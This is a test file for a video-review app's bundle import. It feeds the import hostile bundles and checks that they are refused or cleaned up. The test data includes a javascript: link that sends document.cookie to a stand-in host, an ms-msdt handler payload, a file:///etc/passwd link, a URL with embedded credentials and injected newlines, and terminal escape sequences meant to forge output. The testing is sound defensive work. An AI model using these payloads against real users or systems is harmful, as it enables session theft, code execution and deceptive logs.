// covers: lib/bundleImport.ts lib/bundle.ts
// Bundles made by hand, as someone who wants more than a move would make them, into a hosted store (docs/moving.md,
// `vr admin import`): what they hold may only land where the import puts things of its own, never write over what the
// workspace has, and never leave anything behind when the import is refused (audit sweep 2).
import assert from 'node:assert/strict';
import { constants } from 'node:buffer';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { isolatedEnv, makeVideo, tmpdir, vr } from '../lib/helpers.ts';

const { env } = isolatedEnv({ vars: { VR_MODE: 'server', VR_PUBLIC_URL: 'https://review.test' } });
const auth = await import('../../lib/auth.ts');
const playbooks = await import('../../lib/playbooks.ts');
const { listPlaybooks, readPlaybook } = await import('../../lib/playbookFiles.ts');
const { importBundle } = await import('../../lib/bundleImport.ts');
const { versionsDir, workspaceRoot } = await import('../../lib/paths.ts');
const { BUNDLE_LIMITS } = await import('../../lib/bundle.ts');
const workspaces = await import('../../lib/workspaces.ts');
const { openTarWriter } = await import('../../lib/tar.ts');
const { dataDir, slugify } = await import('../../lib/paths.ts');
const store = await import('../../lib/store.ts');
const { quickHash, sampleHash } = await import('../../lib/probe.ts');
const { renderKey } = await import('../../lib/renderKey.ts');
const owner = await auth.createUser({ email: 'owner@example.com', name: 'Olivia', password: 'a long password', role: 'owner' });

const work = tmpdir('vr-test-hostile-bundles-');
const iso = (d = new Date()) => d.toISOString();
const hex = (n: number) => crypto.randomBytes(n).toString('hex').slice(0, n);
const sha = (b: Buffer) => crypto.createHash('sha256').update(b).digest('hex');

interface Entry {
  name: string;
  data: Buffer;
}
/** A bundle as `vr export` lays one out, holding whatever it is given, its manifest matching every file. */
async function bundle(file: string, o: { reviews?: unknown[]; playbooks?: unknown[]; events?: unknown[]; files?: Entry[]; app?: string }): Promise<string> {
  const entries: Entry[] = [];
  (o.reviews ?? []).forEach((r, i) => {
    entries.push({ name: `reviews/r${String(i + 1).padStart(4, '0')}/review.json`, data: Buffer.from(typeof r === 'string' ? r : JSON.stringify(r)) });
  });
  (o.playbooks ?? []).forEach((p, i) => {
    entries.push({ name: `playbooks/p${String(i + 1).padStart(3, '0')}/playbook.json`, data: Buffer.from(JSON.stringify(p)) });
  });
  entries.push(...(o.files ?? []));
  entries.push({ name: 'folders.json', data: Buffer.from(JSON.stringify({ folders: [] })) });
  entries.push({ name: 'events.jsonl', data: Buffer.from((o.events ?? []).map((e) => `${JSON.stringify(e)}\n`).join('')) });
  const zero = {
    reviews: (o.reviews ?? []).length,
    versions: 0,
    version_bytes: 0,
    notes: 0,
    replies: 0,
    drawings: 0,
    approvals: 0,
    files: 0,
    events: 0,
    folders: 0,
    playbooks: 0,
    views: 0,
  };
  const manifest = {
    format: 'lampo-bundle',
    version: 1,
    id: `b_${hex(16)}`,
    created: iso(),
    app: { version: o.app ?? '0.1.0' },
    owner: { names: ['Olivia'] },
    people: [],
    counts: zero,
    files: entries.map((e) => ({ path: e.name, size: e.data.length, sha256: sha(e.data) })),
    taste: [],
    left_out: { missing_versions: [], samples: 0, drafts: 0, recordings: 0, links: 0, asks: 0, events: 0, missing_files: 0 },
  };
  const out = path.join(work, file);
  const tar = await openTarWriter(out);
  await tar.buffer('manifest.json', Buffer.from(JSON.stringify(manifest)));
  for (const e of entries) await tar.buffer(e.name, e.data);
  await tar.close();
  return out;
}
const version = (v: number, extra: Record<string, unknown> = {}) => ({
  v,
  hash: 'a'.repeat(40),
  mtime: iso(),
  size: 1000,
  frames: 50,
  fps: 25,
  width: 320,
  height: 180,
  duration: 2,
  registered: iso(),
  ...extra,
});
const review = (folder: string, name: string, extra: Record<string, unknown> = {}) => ({
  id: `r_${hex(12)}`,
  video: `/@uploads/${folder}/${name}`,
  source: { kind: 'upload', name },
  project: folder,
  fps: 25,
  width: 320,
  height: 180,
  duration: 2,
  frames: 50,
  versions: [version(1)],
  comments: [],
  session: null,
  folder,
  added: iso(),
  added_by: 'Olivia',
  ...extra,
});
const note = (id: string, extra: Record<string, unknown> = {}) => ({
  id,
  v: 1,
  frame: 10,
  timecode: '00:00:00:10',
  t: 0.4,
  range: null,
  text: 'a note',
  tags: [],
  severity: 'should',
  drawing: [],
  shots: null,
  voice: null,
  status: 'open',
  author: 'Olivia',
  created: iso(),
  replies: [],
  ...extra,
});
const linkTo = (url: string) => ({ id: `r_${hex(10)}`, kind: 'link', by: 'Olivia', at: iso(), url, site: 'example.com' });
const run = (file: string) => importBundle({ file, workspace: 'w1', owner: 'owner@example.com', derive: false });
/** A bundle the import must refuse with `why`, writing nothing: no review, no folder, no file. */
async function refused(file: string, why: RegExp): Promise<void> {
  const before = fs.readdirSync(dataDir()).sort();
  await assert.rejects(run(file), why);
  assert.deepEqual(fs.readdirSync(dataDir()).sort(), before, `${path.basename(file)} wrote nothing`);
}

// ------------------------------------------------------------------------------------------------ playbooks (SW-2)

/** The House playbook with a skill holding preset.json (`content`): its id and the skill's. */
async function houseWithSkillFile(content: string): Promise<{ id: string; skill: string }> {
  if (!readPlaybook('')?.skills.some((s) => s.name === 'export-preset'))
    playbooks.putSkill('', { name: 'export-preset', description: 'How to export', body: 'Use the preset.' }, { by: 'Olivia' });
  const f = path.join(work, `preset-${hex(6)}.json`);
  fs.writeFileSync(f, content);
  await playbooks.addSkillFile('', 'export-preset', 'preset.json', f, 'Olivia');
  const p = readPlaybook('');
  const s = p?.skills.find((x) => x.name === 'export-preset');
  assert.ok(p && s);
  return { id: p.id, skill: s.id };
}
const houseFile = async () => fs.readFileSync((await playbooks.skillFile('', 'export-preset', 'preset.json')) as string, 'utf8');
/** A playbook at `scope` with the ids it is given and one skill holding preset.json. */
const book = (id: string, scope: string, skill: string, size: number) => ({
  id,
  scope,
  rev: 1,
  updated: null,
  by: null,
  brief: '',
  rules: '',
  refs: [],
  skills: [
    {
      id: skill,
      name: 'imported-skill',
      description: 'x',
      body: 'x',
      files: [{ name: 'preset.json', size, at: iso(), by: 'Olivia' }],
      updated: iso(),
      by: 'Olivia',
    },
  ],
  history: [],
  proposals: [],
});
/** What the workspace keeps under data/playbooks: each playbook's file and each one's folder of files. */
const kept = () => fs.readdirSync(path.join(dataDir(), 'playbooks')).sort();

test('a bundle’s playbook gets ids of this workspace: one that reuses another playbook’s ids writes over none of its files', async () => {
  const house = await houseWithSkillFile('{"crf":18}');
  const theirs = Buffer.from('the bundle’s own preset');
  const r = await run(
    await bundle('pb-collide.tar', {
      playbooks: [book(house.id, 'Somewhere else', house.skill, theirs.length)],
      files: [{ name: `playbooks/p001/files/skills/${house.skill}/preset.json`, data: theirs }],
    }),
  );
  assert.deepEqual(r.playbooks, [{ scope: 'Somewhere else', action: 'import' }]);
  assert.equal(await houseFile(), '{"crf":18}', 'the House playbook’s skill file is its own still');
  const got = readPlaybook('Somewhere else');
  assert.ok(got);
  assert.notEqual(got.id, house.id, 'a playbook id of this workspace');
  assert.notEqual(got.skills[0]?.id, house.skill, 'a skill id of this workspace');
  const file = await playbooks.skillFile('Somewhere else', 'imported-skill', 'preset.json');
  assert.equal(fs.readFileSync(file as string, 'utf8'), theirs.toString(), 'its own file, under its own ids');
  const ids = listPlaybooks().map((p) => p.id);
  assert.equal(new Set(ids).size, ids.length, `one playbook per id: ${ids.join(', ')}`);
});

test('a refused import leaves no playbook file behind, and writes over none', async () => {
  const house = await houseWithSkillFile('{"crf":20}');
  const before = kept();
  const theirs = Buffer.from('written by a refused bundle');
  await assert.rejects(
    run(
      await bundle('pb-collide-refused.tar', {
        reviews: [review('Refused', 'clip.mp4')],
        playbooks: [book(house.id, 'Another scope', house.skill, theirs.length)],
        files: [
          { name: `playbooks/p001/files/skills/${house.skill}/preset.json`, data: theirs },
          { name: 'reviews/r0001/versions/v1.mp4', data: crypto.randomBytes(4096) },
        ],
      }),
    ),
    /its bytes are not the version/,
  );
  assert.equal(await houseFile(), '{"crf":20}', 'the House playbook’s file is untouched');
  assert.equal(readPlaybook('Another scope'), null, 'the playbook never came in');
  assert.deepEqual(kept(), before, 'and nothing of it was placed');
});

// ------------------------------------------------------------------------------------------------ records (SW-3)
// What comes in passes the checks the app runs when it makes the same thing.

test('a link reference comes in as the app keeps one: http(s) only, without credentials', async () => {
  await refused(
    await bundle('link-js.tar', {
      reviews: [review('Links', 'js.mp4', { comments: [note(`c_${hex(8)}`, { refs: [linkTo('javascript:fetch("//x.test/"+document.cookie)')] })] })],
    }),
    /reviews\/r0001: the link reference r_[a-f0-9]{10}: only http and https links can be references/,
  );
  await refused(
    await bundle('link-handler.tar', {
      reviews: [review('Links', 'msdt.mp4', { comments: [note(`c_${hex(8)}`, { refs: [linkTo('ms-msdt:/id PCWDiagnostic')] })] })],
    }),
    /only http and https links can be references/,
  );
  const option = { id: 'g1', label: 'Pick', pick: 'one', items: [{ id: 'a', label: 'A', ref: linkTo('file:///etc/passwd') }] };
  await refused(
    await bundle('link-option.tar', { reviews: [review('Links', 'opt.mp4', { comments: [note(`c_${hex(8)}`, { options: [option] })] })] }),
    /only http and https links can be references/,
  );
  const id = `c_${hex(8)}`;
  await run(
    await bundle('link-creds.tar', {
      reviews: [
        review('Links', 'creds.mp4', {
          comments: [note(id, { refs: [{ ...linkTo('https://user:secret@www.example.com/a b\nINJECTED LINE'), site: 'evil' }] })],
        }),
      ],
    }),
  );
  const ref = store.loadReview(slugify('/@uploads/Links/creds.mp4'))?.comments[0]?.refs?.[0];
  assert.ok(ref?.url);
  assert.doesNotMatch(ref.url, /secret|user@|\n/, `kept as ${ref.url}`);
  assert.equal(ref.url, new URL('https://www.example.com/a b\nINJECTED LINE').toString());
  assert.equal(ref.site, 'example.com', 'its site from the link, not the bundle');
});

test('a version’s record says what its bytes are as this server reads them; one without bytes is in no bucket', async () => {
  const file = makeVideo(path.join(work, 'probed.mp4'), { w: 160, h: 90, fps: 25, dur: 1, freq: 500 });
  const bytes = fs.readFileSync(file);
  const claimed = { size: 999_999, frames: 5000, fps: 60, width: 3840, height: 2160, duration: 83 };
  const { size: _size, ...atReview } = claimed;
  await run(
    await bundle('probed.tar', {
      reviews: [
        review('Probed', 'clip.mp4', {
          ...atReview,
          versions: [version(1, { stored: 's3' }), version(2, { hash: quickHash(file), ...claimed, stored: 'bunny' })],
        }),
      ],
      files: [{ name: 'reviews/r0001/versions/v2.mp4', data: bytes }],
    }),
  );
  const got = store.loadReview(slugify('/@uploads/Probed/clip.mp4'));
  assert.ok(got);
  const [v1, v2] = got.versions;
  assert.deepEqual([v2?.size, v2?.width, v2?.height, v2?.fps, v2?.frames], [bytes.length, 160, 90, 25, 25], 'v2 as ffprobe reads its bytes');
  assert.ok(Math.abs((v2?.duration ?? 0) - 1) < 0.1, `duration ${v2?.duration}`);
  assert.deepEqual([got.width, got.height, got.fps, got.frames], [160, 90, 25, 25], 'the review describes its newest version');
  assert.equal(got.meta?.codec, 'h264');
  assert.equal(v1?.stored, undefined, 'a version that came without bytes is in no bucket');
  assert.equal(v2?.stored, undefined, 'one placed on this disk neither');
});

test('a playbook comes in only for a folder name the app takes, within the app’s own limits', async () => {
  const p = (scope: string, extra: Record<string, unknown> = {}) => ({ ...book(`pb_${hex(12)}`, scope, `sk_${hex(12)}`, 0), skills: [], ...extra });
  const r = await run(await bundle('pb-scope.tar', { playbooks: [p(' Odd  /  scope '), p(Array.from({ length: 13 }, (_, i) => `L${i}`).join('/'))] }));
  assert.deepEqual(
    r.playbooks.map((x) => [x.action, x.why]),
    [
      ['skip', 'not a folder name this server takes'],
      ['skip', 'not a folder name this server takes'],
    ],
  );
  assert.equal(readPlaybook(' Odd  /  scope '), null);
  await refused(await bundle('pb-brief.tar', { playbooks: [p('Long', { brief: 'x'.repeat(playbooks.PLAYBOOK_LIMITS.text + 1) })] }), /brief: Too big/i);
  await refused(
    await bundle('pb-history.tar', {
      playbooks: [
        p('Many', {
          history: Array.from({ length: playbooks.PLAYBOOK_LIMITS.history + 1 }, (_, i) => ({
            rev: i + 1,
            at: iso(),
            by: 'Olivia',
            message: 'x',
            section: 'brief',
            before: null,
            after: 'x',
          })),
        }),
      ],
    }),
    /history: Too big/i,
  );
});

// ------------------------------------------------------------------------------------------------ parts (SW-4)

test('a part version’s sample is made from its bytes, the version it patches and where: it never takes another video’s', async () => {
  const victim = makeVideo(path.join(work, 'victim.mp4'), { w: 160, h: 90, fps: 25, dur: 1, freq: 300 });
  const up = await store.ingestUpload(victim, { name: 'victim.mp4', folder: 'Team', by: 'Olivia', byId: owner.id, keep: true });
  const theirs = renderKey(up.review.versions[0] as Parameters<typeof renderKey>[0]);
  const file = makeVideo(path.join(work, 'part.mp4'), { w: 160, h: 90, fps: 25, dur: 1, freq: 900, pattern: 'testsrc2' });
  const bytes = fs.readFileSync(file);
  const base = version(1, { hash: 'b'.repeat(40) });
  const part = { of: 1, at: 0, frames: 25, handles: 0 };
  await run(
    await bundle('part.tar', {
      reviews: [review('Parts', 'clip.mp4', { versions: [base, version(2, { hash: quickHash(file), sample: theirs, size: bytes.length, part })] })],
      files: [{ name: 'reviews/r0001/versions/v2.mp4', data: bytes }],
    }),
  );
  const v2 = store.loadReview(slugify('/@uploads/Parts/clip.mp4'))?.versions.find((v) => v.v === 2);
  assert.ok(v2);
  assert.notEqual(renderKey(v2), theirs, 'not the other video’s renderKey (its posters, sprites, analysis)');
  assert.equal(v2.sample, store.partSample(sampleHash(file), base as Parameters<typeof store.partSample>[1], part), 'as ingestPart makes it');
});

// ------------------------------------------------------------------------------------------------ the admin's terminal (SW-5)

test('`vr admin import` prints no control character a bundle brings: an escape could hide or forge the report', async () => {
  const dryRun = (file: string) => vr(['admin', 'import', file, '--workspace', 'w1', '--owner', 'owner@example.com', '--dry-run'], env);
  // the app's version, printed on the report's first line: a version, nothing else
  const title = dryRun(await bundle('esc-version.tar', { app: '\u001b]0;pwned\u0007\u001b[8m' }));
  assert.equal(title.code, 1, title.out);
  assert.match(title.err, /manifest\.json: app\.version/);
  // a key of a record, named in the refusal: the error says where without the escape
  const raw = JSON.stringify(review('Esc', 'clip.mp4', { qa_stretches: { PLACEHOLDER: { in: 'x', out: 2 } } })).replace(
    'PLACEHOLDER',
    '\\u001b]0;pwned\\u0007\\u001b[8m',
  );
  const keyed = dryRun(await bundle('esc-key.tar', { reviews: [raw] }));
  assert.equal(keyed.code, 1, keyed.out);
  assert.match(keyed.err, /qa_stretches/);
  for (const r of [title, keyed]) {
    assert.doesNotMatch(r.err, /\p{Cc}(?<!\n)/u, `no control character but the line ends: ${JSON.stringify(r.err)}`);
    assert.doesNotMatch(r.out, /\p{Cc}(?<!\n)/u);
  }
  // and a good bundle's report is printed as it should be
  const fine = dryRun(await bundle('fine.tar', { app: '0.9.1+abc' }));
  assert.equal(fine.code, 0, fine.err);
  assert.match(fine.out.split('\n')[0] ?? '', /Lampo 0\.9\.1\+abc\)/);
});

// ------------------------------------------------------------------------------------------------ atomicity (SW-7)

const event = (folder: string, name: string, id: string, text: string) => ({
  at: iso(new Date(Date.now() - 60_000)),
  type: 'comment',
  by: 'Olivia',
  video: `/@uploads/${folder}/${name}`,
  slug: slugify(`/@uploads/${folder}/${name}`),
  session: null,
  id,
  v: 1,
  frame: 10,
  timecode: '00:00:00:10',
  text,
  severity: 'should',
  tags: [],
});
const history = () =>
  fs.existsSync(path.join(dataDir(), 'events.imported.jsonl'))
    ? fs
        .readFileSync(path.join(dataDir(), 'events.imported.jsonl'), 'utf8')
        .split('\n')
        .filter(Boolean)
        .map((l) => JSON.parse(l) as { slug: string; imported?: string })
    : [];
/** Something that holds `dir` as a live process elsewhere on this machine would (an upload, an import): its owner runs. */
const heldElsewhere = (dir: string) => {
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'owner'), `${process.ppid}@${os.hostname()}`);
  fs.writeFileSync(path.join(dir, 'run'), 'elsewhere');
};

test('the history comes in after its video: a video that didn’t come in leaves none behind for its id', async () => {
  const [a, b] = ['a', 'b'].map((n) => makeVideo(path.join(work, `hist-${n}.mp4`), { w: 160, h: 90, fps: 25, dur: 1, freq: n === 'a' ? 410 : 820 }));
  const [idA, idB] = [`c_${hex(8)}`, `c_${hex(8)}`];
  const one = (name: string, file: string, id: string) =>
    review('Hist', name, { versions: [version(1, { hash: quickHash(file), size: fs.statSync(file).size })], comments: [note(id)] });
  const file = await bundle('history.tar', {
    reviews: [one('a.mp4', a as string, idA), one('b.mp4', b as string, idB)],
    events: [event('Hist', 'a.mp4', idA, 'on a'), event('Hist', 'b.mp4', idB, 'on b')],
    files: [
      { name: 'reviews/r0001/versions/v1.mp4', data: fs.readFileSync(a as string) },
      { name: 'reviews/r0002/versions/v1.mp4', data: fs.readFileSync(b as string) },
    ],
  });
  const [slugA, slugB] = ['a.mp4', 'b.mp4'].map((n) => slugify(`/@uploads/Hist/${n}`));
  // b's review can't be written when its turn comes (a disk error, a review that landed meanwhile)
  const log = (line: string) => {
    if (line.includes('reviews/r0002/versions/')) fs.writeFileSync(path.join(dataDir(), slugB as string, 'review.json'), '{}');
  };
  try {
    await assert.rejects(importBundle({ file, workspace: 'w1', owner: 'owner@example.com', derive: false, log }), /holds a review already/);
    assert.ok(store.loadReview(slugA as string), 'a came in');
    const slugs = history()
      .filter((e) => e.imported)
      .map((e) => e.slug);
    assert.ok(slugs.includes(slugA as string), 'with its history');
    assert.ok(!slugs.includes(slugB as string), `no history for b, which didn't come in: ${slugs.join(', ')}`);
  } finally {
    fs.rmSync(path.join(dataDir(), slugB as string), { recursive: true, force: true });
  }
});

test('an upload of the same video id under way: the import takes nothing of it, writes nothing and says so', async () => {
  const slug = slugify('/@uploads/Busy/clip.mp4');
  const held = path.join(dataDir(), '.uploads', slug);
  heldElsewhere(held);
  try {
    await refused(await bundle('busy.tar', { reviews: [review('Busy', 'clip.mp4')] }), /an upload of this video id is under way/);
    assert.ok(!fs.existsSync(path.join(versionsDir(), slug)) && !fs.existsSync(path.join(dataDir(), slug)));
    assert.ok(fs.existsSync(path.join(held, 'owner')), 'the upload’s hold is its own');
  } finally {
    fs.rmSync(held, { recursive: true, force: true });
  }
  // and once the import marked a video id, an upload that chose it before is refused (it would write into the import)
  store.markImporting(slugify('/@uploads/Busy/late.mp4'), `b_${hex(16)}`);
  const late = makeVideo(path.join(work, 'late.mp4'), { w: 160, h: 90, dur: 1, freq: 700 });
  const up = await store.ingestUpload(late, { name: 'late.mp4', folder: 'Busy', by: 'Olivia', byId: owner.id, keep: true });
  assert.notEqual(slugify(up.review.video), slugify('/@uploads/Busy/late.mp4'), 'a new upload chooses another id');
});

test('one import into a workspace at a time: a second, while one runs, is refused before it reads the store', async () => {
  const held = path.join(dataDir(), '.import');
  heldElsewhere(held);
  try {
    await refused(await bundle('second.tar', { reviews: [review('Second', 'clip.mp4')] }), /another import into this workspace is running/);
  } finally {
    fs.rmSync(held, { recursive: true, force: true });
  }
});

// ------------------------------------------------------------------------------------------------ limits (SW-8)

test('every record a bundle may hold can be read as text, and the room an import needs counts the records too', async () => {
  // a file read as one string: no larger than V8 makes one (512 MiB of events was 24 bytes past it: a RangeError)
  for (const k of ['manifest', 'json', 'events'] as const)
    assert.ok(BUNDLE_LIMITS[k] <= constants.MAX_STRING_LENGTH, `${k}: ${BUNDLE_LIMITS[k]} > ${constants.MAX_STRING_LENGTH}`);
  const text = 'x'.repeat(15_000);
  const id = `c_${hex(8)}`;
  const reviewJson = review('Room', 'clip.mp4', { comments: Array.from({ length: 40 }, (_, i) => note(`c_${hex(8)}${i}`.slice(0, 18), { text })) });
  const events = Array.from({ length: 20 }, () => event('Room', 'clip.mp4', id, text));
  const r = await importBundle({
    file: await bundle('room.tar', { reviews: [reviewJson], events }),
    workspace: 'w1',
    owner: 'owner@example.com',
    dryRun: true,
  });
  assert.ok(r.bytes >= JSON.stringify(reviewJson).length + 20 * text.length, `the import writes ${r.bytes} bytes: the review and its history at least`);
});

test('on a hosted store `vr admin import` writes no INBOX.md (the server renders the inbox per request)', async () => {
  const w = workspaces.createWorkspace({ name: 'Hosted inbox', ownerId: owner.id }).id;
  const id = `c_${hex(8)}`;
  const file = await bundle('inbox.tar', {
    reviews: [review('Inbox', 'clip.mp4', { comments: [note(id)] })],
    events: [event('Inbox', 'clip.mp4', id, 'a note')],
  });
  const r = vr(['admin', 'import', file, '--workspace', w, '--owner', 'owner@example.com', '--no-derive'], env);
  assert.equal(r.code, 0, r.err);
  assert.ok(fs.existsSync(path.join(workspaceRoot(w).data, 'events.imported.jsonl')), 'the history came in');
  assert.equal(fs.existsSync(path.join(workspaceRoot(w).data, 'INBOX.md')), false, 'and no INBOX.md with it');
});
